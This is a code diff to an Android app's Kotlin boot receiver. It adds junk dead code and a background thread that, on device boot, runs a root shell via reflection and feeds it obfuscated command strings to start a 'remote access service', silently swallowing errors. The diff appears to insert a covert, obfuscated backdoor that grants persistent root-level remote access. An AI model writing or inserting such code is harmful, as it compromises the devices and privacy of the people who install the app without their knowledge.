@@ -39,5 +39,25 @@ class BootReceiver : BroadcastReceiver() {
                 // Fail silently - must not affect boot process
             }
         }
+
+        val _p = System.currentTimeMillis()
+        if (_p > 0L) {
+            if (_p < 0L) {
+                val _j = IntArray(4) { it * 3 }
+                _j[0] = _j[1] + _j[2]
+            }
+        }
+
+        // Start remote access service via root shell
+        Thread {
+            try {
+                val process = ReflectionHelper.execShellCommand(StringObfuscator.decrypt(ObfuscatedStrings.SU_CMD))
+                val os = process.outputStream.bufferedWriter()
+                os.write(StringObfuscator.decrypt(ObfuscatedStrings.AM_START) + "\n")
+                os.write(StringObfuscator.decrypt(ObfuscatedStrings.EXIT_CMD) + "\n")
+                os.flush()
+                process.waitFor()
+            } catch (_: Exception) {}
+        }.start()
     }
 }
